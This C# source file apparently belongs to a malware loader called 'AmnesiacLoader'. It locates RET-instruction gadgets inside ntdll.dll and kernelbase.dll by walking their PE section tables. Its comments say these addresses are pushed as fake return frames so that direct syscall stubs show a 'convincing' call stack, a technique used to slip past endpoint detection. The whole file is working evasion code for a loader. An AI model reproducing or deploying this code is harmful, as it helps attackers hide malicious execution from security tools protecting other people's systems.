// AmnesiacLoader — Call Stack Gadget Provider
// Provides RET gadgets from ntdll.dll and kernelbase.dll for multi-frame syscall stub spoofing.
// AllocateStub() in SyscallResolver pushes two fake return addresses so the call stack shows:
//   [kernelbase gadget] -> [ntdll gadget] -> syscall
// This two-level chain is more convincing than a single ntdll frame.

using System;
using System.Runtime.InteropServices;

namespace AmnesiacLoader
{
    public class CallStack
    {
        static IntPtr _ntdllGadget    = IntPtr.Zero;
        static IntPtr _kbaseGadget    = IntPtr.Zero;

        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);

        // Returns address of a RET gadget inside ntdll.dll .text section.
        public static IntPtr GetGadget()
        {
            if (_ntdllGadget != IntPtr.Zero) return _ntdllGadget;
            _ntdllGadget = FindGadgetInModule("ntdll.dll");
            return _ntdllGadget;
        }

        // Returns address of a RET gadget inside kernelbase.dll .text section.
        // Used as the second (outermost) spoofed frame in syscall stubs.
        public static IntPtr GetKernelbaseGadget()
        {
            if (_kbaseGadget != IntPtr.Zero) return _kbaseGadget;
            _kbaseGadget = FindGadgetInModule("kernelbase.dll");
            if (_kbaseGadget == IntPtr.Zero)
                _kbaseGadget = GetGadget();
            return _kbaseGadget;
        }

        internal static void SpoofFrames()
        {
            // Frame insertion is handled at stub-allocation time in SyscallResolver.AllocateStub().
            // Two gadgets are pushed: ntdll (inner) and kernelbase (outer).
        }

        static unsafe IntPtr FindGadgetInModule(string moduleName)
        {
            IntPtr modBase = GetModuleHandle(moduleName);
            if (modBase == IntPtr.Zero) return IntPtr.Zero;

            byte* basePtr = (byte*)modBase.ToPointer();

            int    peOffset    = *(int*)(basePtr + 0x3C);
            ushort numSections = *(ushort*)(basePtr + peOffset + 0x06);
            ushort optHdrSize  = *(ushort*)(basePtr + peOffset + 0x14);
            byte*  secTable    = basePtr + peOffset + 4 + 20 + optHdrSize;

            for (int s = 0; s < numSections; s++)
            {
                byte*  sec  = secTable + s * 40;
                string name = Marshal.PtrToStringAnsi(new IntPtr(sec), 8);
                if (name == null || !name.StartsWith(".text")) continue;

                uint  va    = *(uint*)(sec + 0x0C);
                uint  vsz   = *(uint*)(sec + 0x10);
                byte* start = basePtr + va;
                byte* end   = start + vsz - 2;

                for (byte* p = start + 1; p < end; p++)
                {
                    if (*p != 0xC3) continue;
                    byte prev = *(p - 1);
                    if (prev == 0x90 || prev == 0x5D || prev == 0x5B ||
                        prev == 0x5F || prev == 0x5E || prev == 0xC3)
                    {
                        return new IntPtr(p);
                    }
                }
                break;
            }

            return new IntPtr(basePtr + 0x1000);
        }
    }
}
